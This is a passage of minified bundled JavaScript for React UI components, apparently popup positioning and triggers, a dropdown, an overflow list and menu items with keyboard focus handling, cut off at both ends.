e=ed;ek?e+=_-j:e=eh.y-eg.y-Z;let t=i(eu,e),r=i(eu,e,U);t>ep||t===ep&&(!H||r>=em)?(m.current.tb=!0,ed=e,Z=-Z,ec=[rI(ec[0],0),rI(ec[1],0)]):m.current.tb=!1}let eP=eC(eb),e$=ea[1]===en[1];if(eP&&"l"===ea[1]&&(g>q.right||m.current.rl)){let e=eu;e$?e-=O-F:e=ef.x-ev.x-Y;let t=i(e,ed),r=i(e,ed,U);t>ep||t===ep&&(!H||r>=em)?(m.current.rl=!0,eu=e,Y=-Y,ec=[rI(ec[0],1),rI(ec[1],1)]):m.current.rl=!1}if(eP&&"r"===ea[1]&&(f<q.left||m.current.lr)){let e=eu;e$?e+=O-F:e=eh.x-eg.x-Y;let t=i(e,ed),r=i(e,ed,U);t>ep||t===ep&&(!H||r>=em)?(m.current.lr=!0,eu=e,Y=-Y,ec=[rI(ec[0],1),rI(ec[1],1)]):m.current.lr=!1}el.points=[ec[0].join(""),ec[1].join("")],c();let eE=!0===eS?0:eS;"number"==typeof eE&&(f<U.left&&(eu-=f-U.left-Y,e.x+F<U.left+eE&&(eu+=e.x-U.left+F-eE)),g>U.right&&(eu-=g-U.right-Y,e.x>U.right-eE&&(eu+=e.x-U.right+eE)));let eT=!0===ex?0:ex;"number"==typeof eT&&(l<U.top&&(ed-=l-U.top-Z,e.y+j<U.top+eT&&(ed+=e.y-U.top+j-eT)),d>U.bottom&&(ed-=d-U.bottom-Z,e.y>U.bottom-eT&&(ed+=e.y-U.bottom+eT)));let eI=$.x+eu,eR=$.y+ed,eM=e.x,eA=e.y,eD=Math.max(eI,eM),eL=Math.min(eI+O,eM+F),e_=Math.max(eR,eA),eO=Math.min(eR+_,eA+j);s?.(t,el);let ej=G.right-$.x-(eu+$.width),eF=G.bottom-$.y-(ed+$.height);1===J&&(eu=Math.floor(eu),ej=Math.floor(ej)),1===X&&(ed=Math.floor(ed),eF=Math.floor(eF)),u({ready:!0,offsetX:eu/J,offsetY:ed/X,offsetR:ej/J,offsetB:eF/X,arrowX:((eD+eL)/2-eI)/J,arrowY:((e_+eO)/2-eR)/X,scaleX:J,scaleY:X,align:el})}}),g=()=>{u(e=>({...e,ready:!1}))};return(0,tq.default)(g,[o]),(0,tq.default)(()=>{e||g()},[e]),[c.ready,c.offsetX,c.offsetY,c.offsetR,c.offsetB,c.arrowX,c.arrowY,c.scaleX,c.scaleY,c.align,()=>{d.current+=1;let e=d.current;Promise.resolve().then(()=>{d.current===e&&f()})}]}function rM(){let e=i.useRef(null),t=()=>{e.current&&(clearTimeout(e.current),e.current=null)};return i.useEffect(()=>()=>{t()},[]),(r,o)=>{t(),0===o?r():e.current=setTimeout(()=>{r()},1e3*o)}}function rA(){return(rA=Object.assign.bind()).apply(this,arguments)}let rD=e=>{let{prefixCls:t,isMobile:r,ready:o,open:n,align:a,offsetR:s,offsetB:c,offsetX:u,offsetY:d,arrowPos:p,popupSize:m,motion:f,uniqueContainerClassName:g,uniqueContainerStyle:h}=e,v=`${t}-unique-container`,[b,y]=i.default.useState(!1),S=rp(r,o,n,a,s,c,u,d),x=i.default.useRef(S);o&&(x.current=S);let C={};return m&&(C.width=m.width,C.height=m.height),i.default.createElement(rs.default,rA({motionAppear:!0,motionEnter:!0,motionLeave:!0,removeOnLeave:!1,leavedClassName:`${v}-hidden`},f,{visible:n,onVisibleChanged:e=>{y(e)}}),({className:e,style:t})=>{let r=(0,l.clsx)(v,e,g,{[`${v}-visible`]:b});return i.default.createElement("div",{className:r,style:{"--arrow-x":`${p?.x||0}px`,"--arrow-y":`${p?.y||0}px`,...x.current,...C,...t,...h}})})};e.s(["default",0,({children:e,postTriggerProps:t})=>{let[r,o,n,a]=function(){let[e,t]=i.default.useState(null),[r,o]=i.default.useState(!1),[n,a]=i.default.useState(!1),s=i.default.useRef(null);return[(0,e9.useEvent)(e=>{!1===e?(s.current=null,o(!1)):n&&r?s.current=e:(o(!0),t(e),s.current=null,r||a(!0))}),r,e,(0,e9.useEvent)(e=>{e?(a(!1),s.current&&(t(s.current),s.current=null)):(a(!1),s.current=null)})]}(),s=i.useMemo(()=>n&&t?t(n):n,[n,t]),[c,u]=i.useState(null),[d,p]=i.useState(null),m=i.useRef(null),f=(0,e9.useEvent)(e=>{m.current=e,(0,tD.isDOM)(e)&&c!==e&&u(e)}),g=i.useRef(null),h=rM(),v=(0,e9.useEvent)((e,t)=>{g.current=t,h(()=>{r(e)},e.delay)}),b=e=>{h(()=>{g.current?.()||r(!1)},e)},y=(0,e9.useEvent)(e=>{a(e)}),[S,x,C,w,k,P,$,,,E,T]=rR(o,c,s?.target,s?.popupPlacement,s?.builtinPlacements||{},s?.popupAlign,void 0,!1),I=i.useMemo(()=>{if(!s)return"";let e=ry(s.builtinPlacements||{},s.prefixCls||"",E,!1);return(0,l.clsx)(e,s.getPopupClassNameFromAlign?.(E))},[E,s?.getPopupClassNameFromAlign,s?.builtinPlacements,s?.prefixCls]),R=i.useMemo(()=>({show:v,hide:b}),[]);i.useEffect(()=>{T()},[s?.target]);let M=(0,e9.useEvent)(()=>(T(),Promise.resolve())),A=i.useRef({}),D=i.useContext(rg),L=i.useMemo(()=>({registerSubPopup:(e,t)=>{A.current[e]=t,D?.registerSubPopup(e,t)}}),[D]),_=s?.prefixCls;return i.createElement(rh.Provider,{value:R},e,s&&i.createElement(rg.Provider,{value:L},i.createElement(rf,{ref:f,portal:ra,onEsc:s.onEsc,prefixCls:_,popup:s.popup,className:(0,l.clsx)(s.popupClassName,I,`${_}-unique-controlled`),style:s.popupStyle,target:s.target,open:o,keepDom:!0,fresh:!0,autoDestroy:!1,onVisibleChanged:y,ready:S,offsetX:x,offsetY:C,offsetR:w,offsetB:k,onAlign:T,onPrepare:M,onResize:e=>p({width:e.offsetWidth,height:e.offsetHeight}),arrowPos:{x:P,y:$},align:E,zIndex:s.zIndex,mask:s.mask,arrow:s.arrow,motion:s.popupMotion,maskMotion:s.maskMotion,getPopupContainer:s.getPopupContainer},i.createElement(rD,{prefixCls:_,isMobile:!1,ready:S,open:o,align:E,offsetR:w,offsetB:k,offsetX:x,offsetY:C,arrowPos:{x:P,y:$},popupSize:d,motion:s.popupMotion,uniqueContainerClassName:(0,l.clsx)(s.uniqueContainerClassName,I),uniqueContainerStyle:s.uniqueContainerStyle}))))}],42569);var rL=e.i(30294);let r_=function(e=ra){return i.forwardRef((t,r)=>{var o;let n,a,s,c,{prefixCls:u="rc-trigger-popup",children:d,action:p="hover",showAction:m,hideAction:f,popupVisible:g,defaultPopupVisible:h,onOpenChange:v,afterOpenChange:b,onPopupVisibleChange:y,afterPopupVisibleChange:S,mouseEnterDelay:x,mouseLeaveDelay:C=.1,focusDelay:w,blurDelay:k,mask:P,maskClosable:$=!0,getPopupContainer:E,forceRender:T,autoDestroy:I,popup:R,popupClassName:M,uniqueContainerClassName:A,uniqueContainerStyle:D,popupStyle:L,popupPlacement:_,builtinPlacements:O={},popupAlign:j,zIndex:F,stretch:N,getPopupClassNameFromAlign:V,fresh:B,unique:H,alignPoint:z,onPopupClick:U,onPopupAlign:W,arrow:q,popupMotion:G,maskMotion:J,mobile:X,...K}=t,Q=void 0===g,Y=!!X,Z=i.useRef({}),ee=i.useContext(rg),et=i.useMemo(()=>({registerSubPopup:(e,t)=>{Z.current[e]=t,ee?.registerSubPopup(e,t)}}),[ee]),er=i.useContext(rh),eo=t9(),[en,ea]=i.useState(null),ei=i.useRef(null),es=(0,tz.default)(e=>{ei.current=e,(0,tD.isDOM)(e)&&en!==e&&ea(e),ee?.registerSubPopup(eo,e)}),[el,ec]=i.useState(null),eu=i.useRef(null),ed=(0,tz.default)(e=>{let t=(0,tD.getDOM)(e);(0,tD.isDOM)(t)&&el!==t&&(ec(t),eu.current=t)}),ep={},em=(0,tz.default)(e=>el?.contains(e)||(0,ri.getShadowRoot)(el)?.host===e||e===el||en?.contains(e)||(0,ri.getShadowRoot)(en)?.host===e||e===en||Object.values(Z.current).some(t=>t?.contains(e)||e===t)),ef=q?{...!0!==q?q:{}}:null,[eg,eh]=(0,rL.useControlledState)(h||!1,g),ev=eg||!1,eb=i.useMemo(()=>{let e="function"==typeof d?d({open:ev}):d;return i.Children.only(e)},[d,ev]),ey=eb?.props||{},eS=(0,tz.default)(()=>ev),ex=(0,tz.default)((e=0)=>({popup:R,target:el,delay:e,prefixCls:u,popupClassName:M,uniqueContainerClassName:A,uniqueContainerStyle:D,popupStyle:L,popupPlacement:_,builtinPlacements:O,popupAlign:j,zIndex:F,mask:P,maskClosable:$,popupMotion:G,maskMotion:J,arrow:ef,getPopupContainer:E,getPopupClassNameFromAlign:V,id:eo,onEsc:e$}));(0,tq.default)(()=>{er&&H&&el&&!Q&&!ee&&(ev?er.show(ex(x),eS):er.hide(C))},[ev,el]);let eC=i.useRef(ev);eC.current=ev;let ew=(0,tz.default)(e=>{(0,t1.flushSync)(()=>{ev!==e&&(eh(e),v?.(e),y?.(e))})}),ek=rM(),eP=(e,t=0)=>{void 0!==g?ek(()=>{ew(e)},t):er&&H&&Q&&!ee?e?er.show(ex(t),eS):er.hide(t):ek(()=>{ew(e)},t)};function e$({top:e}){e&&eP(!1)}let[eE,eT]=i.useState(!1);(0,tq.default)(e=>{(!e||ev)&&eT(!0)},[ev]);let[eI,eR]=i.useState(null),[eM,eA]=i.useState(null),eD=e=>{eA([e.clientX,e.clientY])},[eL,e_,eO,ej,eF,eN,eV,eB,eH,ez,eU]=rR(ev,en,z&&null!==eM?eM:el,_,O,j,W,Y),[eW,eq]=i.useMemo(()=>{let e=rv(m??p),t=rv(f??p),r=new Set(e),o=new Set(t);return r.has("hover")&&!r.has("click")&&r.add("touch"),o.has("hover")&&!o.has("click")&&o.add("touch"),[r,o]},[p,m,f]),eG=eW.has("click"),eJ=eq.has("click")||eq.has("contextMenu"),eX=(0,tz.default)(()=>{eE||eU()});(0,tq.default)(()=>{if(ev&&el&&en){let t=rx(el),r=rx(en),o=rS(en),n=new Set([o,...t,...r]);function e(){eX(),(()=>{eC.current&&z&&eJ&&eP(!1)})()}return n.forEach(t=>{t.addEventListener("scroll",e,{passive:!0})}),o.addEventListener("resize",e,{passive:!0}),eX(),()=>{n.forEach(t=>{t.removeEventListener("scroll",e),o.removeEventListener("resize",e)})}}},[ev,el,en]),(0,tq.default)(()=>{eX()},[eM,_]),(0,tq.default)(()=>{ev&&!O?.[_]&&eX()},[JSON.stringify(j)]);let eK=i.useMemo(()=>{let e=ry(O,u,ez,z);return(0,l.clsx)(e,V?.(ez))},[ez,V,O,u,z]);i.useImperativeHandle(r,()=>({nativeElement:eu.current,popupElement:ei.current,forceAlign:eX}));let[eQ,eY]=i.useState(0),[eZ,e0]=i.useState(0),e1=()=>{if(N&&el){let e=el.getBoundingClientRect();eY(e.width),e0(e.height)}};function e2(e,t,r,o,n){ep[e]=(a,...i)=>{n&&n()||(o?.(a),eP(t,r)),ey[e]?.(a,...i)}}(0,tq.default)(()=>{eI&&(eU(),eI(),eR(null))},[eI]);let e3=eW.has("touch"),e4=eq.has("touch"),e6=i.useRef(!1);(e3||e4)&&(ep.onTouchStart=(...e)=>{e6.current=!0,eC.current&&e4?eP(!1):!eC.current&&e3&&eP(!0),ey.onTouchStart?.(...e)}),(eG||eJ)&&(ep.onClick=(e,...t)=>{eC.current&&eJ?eP(!1):!eC.current&&eG&&(eD(e),eP(!0)),ey.onClick?.(e,...t),e6.current=!1});let e5=(o=eJ||e4,(s=i.useRef(ev)).current=ev,c=i.useRef(!1),i.useEffect(()=>{if(o&&en&&(!P||$)){let e=()=>{c.current=!1},t=e=>{!s.current||em(e.composedPath?.()?.[0]||e.target)||c.current||eP(!1)},r=rS(en);r.addEventListener("pointerdown",e,!0),r.addEventListener("mousedown",t,!0),r.addEventListener("contextmenu",t,!0);let o=(0,ri.getShadowRoot)(el);return o&&(o.addEventListener("mousedown",t,!0),o.addEventListener("contextmenu",t,!0)),()=>{r.removeEventListener("pointerdown",e,!0),r.removeEventListener("mousedown",t,!0),r.removeEventListener("contextmenu",t,!0),o&&(o.removeEventListener("mousedown",t,!0),o.removeEventListener("contextmenu",t,!0))}}},[o,el,en,P,$]),function(){c.current=!0}),e8=eW.has("hover"),e7=eq.has("hover"),e9=()=>e6.current;if(e8){let e=e=>{eD(e)};e2("onMouseEnter",!0,x,e,e9),e2("onPointerEnter",!0,x,e,e9),n=e=>{(ev||eE)&&en?.contains(e.target)&&eP(!0,x)},z&&(ep.onMouseMove=e=>{ey.onMouseMove?.(e)})}e7&&(e2("onMouseLeave",!1,C,void 0,e9),e2("onPointerLeave",!1,C,void 0,e9),a=()=>{eP(!1,C)}),eW.has("focus")&&e2("onFocus",!0,w),eq.has("focus")&&e2("onBlur",!1,k),eW.has("contextMenu")&&(ep.onContextMenu=(e,...t)=>{eC.current&&eq.has("contextMenu")?eP(!1):(eD(e),eP(!0)),e.preventDefault(),ey.onContextMenu?.(e,...t)});let te=i.useRef(!1);te.current||=T||ev||eE;let tt={...ey,...ep},tr={};["onContextMenu","onClick","onMouseDown","onTouchStart","onMouseEnter","onMouseLeave","onFocus","onBlur"].forEach(e=>{K[e]&&(tr[e]=(...t)=>{tt[e]?.(...t),K[e](...t)})}),tN(ev,el,()=>{e1(),eX()});let to=(0,tL.useComposeRef)(ed,(0,tL.getNodeRef)(eb)),tn=i.cloneElement(eb,{...tt,...tr,ref:to});return i.createElement(i.Fragment,null,tn,te.current&&(!er||!H)&&i.createElement(rg.Provider,{value:et},i.createElement(rf,{portal:e,ref:es,prefixCls:u,popup:R,className:(0,l.clsx)(M,!Y&&eK),style:L,target:el,onMouseEnter:n,onMouseLeave:a,onPointerEnter:n,zIndex:F,open:ev,keepDom:eE,fresh:B,onClick:U,onPointerDownCapture:e5,mask:P,motion:G,maskMotion:J,onVisibleChanged:e=>{eT(!1),eU(),b?.(e),S?.(e)},onPrepare:()=>new Promise(e=>{e1(),eR(()=>e)}),forceRender:T,autoDestroy:I||!1,getPopupContainer:E,onEsc:e$,align:ez,arrow:ef,arrowPos:{x:eN,y:eV},ready:eL,offsetX:e_,offsetY:eO,offsetR:ej,offsetB:eF,onAlign:eX,stretch:N,targetWidth:eQ/eB,targetHeight:eZ/eH,mobile:X})))})}(ra);e.s(["default",0,r_],49637);var rO=e.i(30731);let{ESC:rj,TAB:rF}=rO.default,rN=(0,i.forwardRef)((e,t)=>{let{overlay:r,arrow:o,prefixCls:n}=e,a=(0,i.useMemo)(()=>"function"==typeof r?r():r,[r]),s=(0,tL.composeRef)(t,(0,tL.getNodeRef)(a));return i.default.createElement(i.default.Fragment,null,o&&i.default.createElement("div",{className:`${n}-arrow`}),i.default.cloneElement(a,{ref:(0,tL.supportRef)(a)?s:void 0}))}),rV={adjustX:1,adjustY:1},rB=[0,0],rH={topLeft:{points:["bl","tl"],overflow:rV,offset:[0,-4],targetOffset:rB},top:{points:["bc","tc"],overflow:rV,offset:[0,-4],targetOffset:rB},topRight:{points:["br","tr"],overflow:rV,offset:[0,-4],targetOffset:rB},bottomLeft:{points:["tl","bl"],overflow:rV,offset:[0,4],targetOffset:rB},bottom:{points:["tc","bc"],overflow:rV,offset:[0,4],targetOffset:rB},bottomRight:{points:["tr","br"],overflow:rV,offset:[0,4],targetOffset:rB}};function rz(){return(rz=Object.assign.bind()).apply(this,arguments)}let rU=i.default.forwardRef((e,t)=>{let{arrow:r=!1,prefixCls:o="rc-dropdown",transitionName:n,animation:a,align:s,placement:c="bottomLeft",placements:u=rH,getPopupContainer:d,showAction:p,hideAction:m,overlayClassName:f,overlayStyle:g,visible:h,trigger:v=["hover"],autoFocus:b,overlay:y,children:S,onVisibleChange:x,...C}=e,[w,k]=i.default.useState(),P="visible"in e?h:w,$=a?`${o}-${a}`:n,E=i.default.useRef(null),T=i.default.useRef(null),I=i.default.useRef(null);i.default.useImperativeHandle(t,()=>E.current);let R=e=>{k(e),x?.(e)};!function({visible:e,triggerRef:t,onVisibleChange:r,autoFocus:o,overlayRef:n}){let a=i.useRef(!1),s=()=>{e&&(t.current?.focus?.(),r?.(!1))},l=()=>!!n.current?.focus&&(n.current.focus(),a.current=!0,!0),c=e=>{switch(e.keyCode){case rj:s();break;case rF:{let t=!1;a.current||(t=l()),t?e.preventDefault():s()}}};i.useEffect(()=>e?(window.addEventListener("keydown",c),o&&(0,eJ.default)(l,3),()=>{window.removeEventListener("keydown",c),a.current=!1}):()=>{a.current=!1},[e])}({visible:P,triggerRef:I,onVisibleChange:R,autoFocus:b,overlayRef:T});let M=()=>i.default.createElement(rN,{ref:T,overlay:y,prefixCls:o,arrow:r}),A=i.default.cloneElement(S,{className:(0,l.clsx)(S.props?.className,P&&(()=>{let{openClassName:t}=e;return void 0!==t?t:`${o}-open`})()),ref:(0,tL.supportRef)(S)?(0,tL.composeRef)(I,(0,tL.getNodeRef)(S)):void 0}),D=m;return D||-1===v.indexOf("contextMenu")||(D=["click"]),i.default.createElement(r_,rz({builtinPlacements:u},C,{prefixCls:o,ref:E,popupClassName:(0,l.clsx)(f,{[`${o}-show-arrow`]:r}),popupStyle:g,action:v,showAction:p,hideAction:D,popupPlacement:c,popupAlign:s,popupMotion:{motionName:$},popupVisible:P,stretch:(()=>{let{minOverlayWidthMatchTrigger:t,alignPoint:r}=e;return"minOverlayWidthMatchTrigger"in e?t:!r})()?"minWidth":"",popup:"function"==typeof y?M:M(),onOpenChange:R,onPopupClick:t=>{let{onOverlayClick:r}=e;k(!1),r&&r(t)},getPopupContainer:d}),A)});e.s(["default",0,rU],28235);var rW=e.i(31067);let rq,rG=i.forwardRef(function(e,t){let r,{prefixCls:o,invalidate:n,item:a,renderItem:s,responsive:c,responsiveDisabled:u,registerSize:d,itemKey:p,className:m,style:f,children:g,display:h,order:v,component:b="div",...y}=e,S=c&&!h;i.useEffect(()=>()=>{d(p,null)},[]);let x=s&&a!==rq?s(a,{index:v}):g;n||(r={opacity:+!S,height:S?0:rq,overflowY:S?"hidden":rq,order:c?v:rq,pointerEvents:S?"none":rq,position:S?"absolute":rq});let C={};S&&(C["aria-hidden"]=!0);let w=i.createElement(b,(0,rW.default)({className:(0,l.clsx)(!n&&o,m),style:{...r,...f}},C,y,{ref:t}),x);return c&&(w=i.createElement(tH,{onResize:({offsetWidth:e})=>{d(p,e)},disabled:u},w)),w});function rJ(e,t){let[r,o]=i.useState(t);return[r,(0,tz.default)(t=>{e(()=>{o(t)})})]}let rX=i.default.createContext(null),rK=i.forwardRef((e,t)=>{let r=i.useContext(rX);if(!r){let{component:r="div",...o}=e;return i.createElement(r,(0,rW.default)({},o,{ref:t}))}let{className:o,...n}=r,{className:a,...s}=e;return i.createElement(rX.Provider,{value:null},i.createElement(rG,(0,rW.default)({ref:t,className:(0,l.clsx)(o,a)},n,s)))}),rQ="responsive",rY="invalidate";function rZ(e){return`+ ${e.length} ...`}let r0=i.forwardRef(function(e,t){let r,{prefixCls:o="rc-overflow",data:n=[],renderItem:a,renderRawItem:s,itemKey:c,itemWidth:u=10,ssr:d,style:p,className:m,maxCount:f,renderRest:g,renderRawRest:h,prefix:v,suffix:b,component:y="div",itemComponent:S,onVisibleChange:x,...C}=e,w="full"===d,k=(r=i.useRef(null),e=>{if(!r.current){r.current=[];var t=()=>{(0,t1.unstable_batchedUpdates)(()=>{r.current.forEach(e=>{e()}),r.current=null})};if("u"<typeof MessageChannel)(0,eJ.default)(t);else{let e=new MessageChannel;e.port1.onmessage=()=>t(),e.port2.postMessage(void 0)}}r.current.push(e)}),[P,$]=rJ(k,null),E=P||0,[T,I]=rJ(k,new Map),[R,M]=rJ(k,0),[A,D]=rJ(k,0),[L,_]=rJ(k,0),[O,j]=rJ(k,0),[F,N]=(0,i.useState)(null),[V,B]=(0,i.useState)(null),H=i.useMemo(()=>null===V&&w?Number.MAX_SAFE_INTEGER:V||0,[V,P]),[z,U]=(0,i.useState)(!1),W=`${o}-item`,q=Math.max(R,A),G=f===rQ,J=n.length&&G,X=f===rY,K=J||"number"==typeof f&&n.length>f,Q=(0,i.useMemo)(()=>{let e=n;return J?e=null===P&&w?n:n.slice(0,Math.min(n.length,E/u)):"number"==typeof f&&(e=n.slice(0,f)),e},[n,u,P,f,J]),Y=(0,i.useMemo)(()=>J?n.slice(H+1):n.slice(Q.length),[n,Q,J,H]),Z=(0,i.useCallback)((e,t)=>"function"==typeof c?c(e):(c&&e?.[c])??t,[c]),ee=(0,i.useCallback)(a||(e=>e),[a]);function et(e,t,r){(V!==e||void 0!==t&&t!==F)&&(B(e),r||(U(e<n.length-1),x?.(e)),void 0!==t&&N(t))}function er(e,t){I(r=>{let o=new Map(r);return null===t?o.delete(e):o.set(e,t),o})}function eo(e){return T.get(Z(Q[e],e))}(0,tq.default)(()=>{if(E&&"number"==typeof q&&Q){let e=L+O,t=Q.length,r=t-1;if(!t)return void et(0,null);for(let o=0;o<t;o+=1){let t=eo(o);if(w&&(t=t||0),void 0===t){et(o-1,void 0,!0);break}if(e+=t,0===r&&e<=E||o===r-1&&e+eo(r)<=E){et(r,null);break}if(e+q>E){et(o-1,e-t-O+A);break}}b&&eo(0)+O>E&&N(null)}},[E,T,A,L,O,Z,Q]);let en=z&&!!Y.length,ea={};null!==F&&J&&(ea={position:"absolute",left:F,top:0});let ei={prefixCls:W,responsive:J,component:S,invalidate:X},es=s?(e,t)=>{let r=Z(e,t);return i.createElement(rX.Provider,{key:r,value:{...ei,order:t,item:e,itemKey:r,registerSize:er,display:t<=H}},s(e,t))}:(e,t)=>{let r=Z(e,t);return i.createElement(rG,(0,rW.default)({},ei,{order:t,key:r,item:e,renderItem:ee,itemKey:r,registerSize:er,display:t<=H}))},el={order:en?H:Number.MAX_SAFE_INTEGER,className:`${W}-rest`,registerSize:function(e,t){D(t),M(A)},display:en},ec=g||rZ,eu=h?i.createElement(rX.Provider,{value:{...ei,...el}},h(Y)):i.createElement(rG,(0,rW.default)({},ei,el),"function"==typeof ec?ec(Y):ec),ed=i.createElement(y,(0,rW.default)({className:(0,l.clsx)(!X&&o,m),style:p,ref:t},C),v&&i.createElement(rG,(0,rW.default)({},ei,{responsive:G,responsiveDisabled:!J,order:-1,className:`${W}-prefix`,registerSize:function(e,t){_(t)},display:!0}),v),Q.map(es),K?eu:null,b&&i.createElement(rG,(0,rW.default)({},ei,{responsive:G,responsiveDisabled:!J,order:H,className:`${W}-suffix`,registerSize:function(e,t){j(t)},display:!0,style:ea}),b));return G?i.createElement(tH,{onResize:function(e,t){$(t.clientWidth)},disabled:!J},ed):ed});r0.Item=rK,r0.RESPONSIVE=rQ,r0.INVALIDATE=rY;let r1=i.createContext(null);function r2(e){var t;return t=i.useContext(r1),`${t}-${e}`}var r3=e.i(78749);let r4=i.createContext(null);function r6({children:e,locked:t,...r}){let o=i.useContext(r4),n=(0,r3.default)(()=>{let e;return e={...o},Object.keys(r).forEach(t=>{let o=r[t];void 0!==o&&(e[t]=o)}),e},[o,r],(e,r)=>!t&&(e[0]!==r[0]||!(0,V.default)(e[1],r[1],!0)));return i.createElement(r4.Provider,{value:n},e)}let r5=i.createContext(null);function r8(){return i.useContext(r5)}let r7=i.createContext([]);function r9(e){let t=i.useContext(r7);return i.useMemo(()=>void 0!==e?[...t,e]:t,[t,e])}let oe=i.createContext(null);e.s(["PathRegisterContext",0,r5,"PathTrackerContext",0,r7,"PathUserContext",0,oe,"useFullPath",()=>r9,"useMeasure",()=>r8],60698);let ot=i.createContext({});function or(e,t=!1){if((0,rb.default)(e)){let r=e.nodeName.toLowerCase(),o=["input","select","textarea","button"].includes(r)||e.isContentEditable||"a"===r&&!!e.getAttribute("href"),n=e.getAttribute("tabindex"),a=Number(n),i=null;return n&&!Number.isNaN(a)?i=a:o&&null===i&&(i=0),o&&e.disabled&&(i=null),null!==i&&(i>=0||t&&i<0)}return!1}function oo(e,t=!1){let r=[...e.querySelectorAll("*")].filter(e=>or(e,t));return or(e,t)&&r.unshift(e),r}function on(e,t){if(!e)return;e.focus(t);let{cursor:r}=t||{};if(r&&(e instanceof HTMLInputElement||e instanceof HTMLTextAreaElement)){let t=e.value.length;switch(r){case"start":e.setSelectionRange(0,0);break;case"end":e.setSelectionRange(t,t);break;default:e.setSelectionRange(0,t)}}}e.s(["getFocusNodeList",()=>oo,"triggerFocus",()=>on],63611);let{LEFT:oa,RIGHT:oi,UP:os,DOWN:ol,ENTER:oc,ESC:ou,HOME:od,END:op}=rO.default,om=[os,ol,oa,oi];function of(e,t){return oo(e,!0).filter(e=>t.has(e))}function og(e,t,r,o=1){if(!e)return null;let n=of(e,t),a=n.length,i=n.findIndex(e=>r===e);return o<0?-1===i?i=a-1:i-=1:o>0&&(i+=1),n[i=(i+a)%a]}let oh=(e,t)=>{let r=new Set,o=new Map,n=new Map;return e.forEach(e=>{let a=document.querySelector(`[data-menu-id='${t}-${e}']`);a&&(r.add(a),n.set(a,e),o.set(e,a))}),{elements:r,key2element:o,element2key:n}},ov="__RC_UTIL_PATH_SPLIT__",ob="rc-menu-more";function oy(e){let t=i.useRef(e);t.current=e;let r=i.useCallback((...e)=>t.current?.(...e),[]);return e?r:void 0}var oS=e.i(80573),ox=i;function oC(e,t,r,o){let{activeKey:n,onActive:a,onInactive:s}=i.useContext(r4),l={active:n===e};return t||(l.onMouseEnter=t=>{r?.({key:e,domEvent:t}),a(e)},l.onMouseLeave=t=>{o?.({key:e,domEvent:t}),s(e)}),l}function ow(e){let{mode:t,rtl:r,inlineIndent:o}=i.useContext(r4);return"inline"!==t?null:r?{paddingRight:e*o}:{paddingLeft:e*o}}function ok({icon:e,props:t,children:r}){let o;return null===e||!1===e?null:("function"==typeof e?o=i.createElement(e,{...t}):"boolean"!=typeof e&&(o=e),o||r||null)}function oP({item:e,...t}){return Object.defineProperty(t,"item",{get:()=>((0,B.default)(!1,"`info.item` is deprecated since we will move to function component that not provides React Node instance in future."),e)}),t}function o$(){return(o$=Object.assign.bind()).apply(this,arguments)}class oE extends ox.Component{render(){let{title:e,attribute:t,elementRef:r,...o}=this.props,n=(0,oS.default)(o,["eventKey","popupClassName","popupOffset","onTitleClick"]);return(0,B.default)(!t,"`attribute` of Menu.Item is deprecated. Please pass attribute directly."),ox.createElement(r0.Item,o$({},t,{title:"string"==typeof e?e:void 0},n,{ref:r}))}}let oT=ox.forwardRef((e,t)=>{let{style:r,className:o,eventKey:n,warnKey:a,disabled:i,itemIcon:s,children:c,role:u,onMouseEnter:d,onMouseLeave:p,onClick:m,onKeyDown:f,onFocus:g,...h}=e,v=r2(n),{prefixCls:b,onItemClick:y,disabled:S,overflowDisabled:x,itemIcon:C,selectedKeys:w,onActive:k}=ox.useContext(r4),{_internalRenderMenuItem:P}=ox.useContext(ot),$=`${b}-item`,E=ox.useRef(),T=ox.useRef(),I=S||i,R=(0,tL.useComposeRef)(t,T),M=r9(n),A=e=>({key:n,keyPath:[...M].reverse(),item:E.current,domEvent:e}),{active:D,...L}=oC(n,I,d,p),_=w.includes(n),O=ow(M.length),j={};"option"===e.role&&(j["aria-selected"]=_);let F=ox.createElement(oE,o$({ref:E,elementRef:R,role:null===u?"none":u||"menuitem",tabIndex:i?null:-1,"data-menu-id":x&&v?null:v},(0,oS.default)(h,["extra"]),L,j,{component:"li","aria-disabled":i,style:{...O,...r},className:(0,l.clsx)($,{[`${$}-active`]:D,[`${$}-selected`]:_,[`${$}-disabled`]:I},o),onClick:e=>{if(I)return;let t=A(e);m?.(oP(t)),y(t)},onKeyDown:e=>{if(f?.(e),e.which===rO.default.ENTER){let t=A(e);m?.(oP(t)),y(t)}},onFocus:e=>{k(n),g?.(e)}}),c,ox.createElement(ok,{props:{...e,isSelected:_},icon:s||C}));return P&&(F=P(F,e,{selected:_})),F}),oI=ox.forwardRef(function(e,t){let{eventKey:r}=e,o=r8(),n=r9(r);return(ox.useEffect(()=>{if(o)return o.registerPath(r,n),()=>{o.unregisterPath(r,n)}},[n]),o)?null:ox.createElement(oT,o$({},e,{ref:t}))});function oR(){return(oR=Object.assign.bind()).apply(this,arguments)}e.s(["default",0,oI],65044);let oM=i.forwardRef(({className:e,children:t,...r},o)=>{let{prefixCls:n,mode:a,rtl:s}=i.useContext(r4);return i.createElement("ul",oR({className:(0,l.clsx)(n,s&&`${n}-rtl`,`${n}-sub`,`${n}-${"inline"===a?"inline":"vertical"}`,e),role:"menu"},r,{"data-menu-list":!0,ref:o}),t)});function oA(e,t){return(0,N.default)(e).map((e,r)=>{if(i.isValidElement(e)){let{key:o}=e,n=e.props?.eventKey??o;null==n&&(n=`tmp_key-${[...t,r].join("-")}`);let a={key:n,eventKey:n};return i.cloneElement(e,a)}return e})}let oD={adjustX:1,adjustY:1},oL={topLeft:{points:["bl","tl"],overflow:oD},topRight:{points:["br","tr"],overflow:oD},bottomLeft:{points:["tl","bl"],overflow:oD},bottomRight:{points:["tr","br"],overflow:oD},leftTop:{points:["tr","tl"],overflow:oD},leftBottom:{points:["br","bl"],overflow:oD},rightTop:{points:["tl","tr"],overflow:oD},rightBottom:{points:["bl","br"],overflow:oD}},o_={topLeft:{points:["bl","tl"],overflow:oD},topRight:{points:["br","tr"],overflow:oD},bottomLeft:{points:["tl","bl"],overflow:oD},bottomRight:{points:["tr","br"],overflow:oD},rightTop:{points:["tr","tl"],overflow:oD},rightBottom:{points:["br","bl"],overflow:oD},leftTop:{points:["tl","tr"],overflow:oD},leftBottom:{points:["bl","br"],overflow:oD}};function oO(e,t,r){return t||(r?r[e]||r.other:void 0)}let oj={horizontal:"bottomLeft",vertical:"rightTop","vertical-left":"rightTop","vertical-right":"leftTop"};function 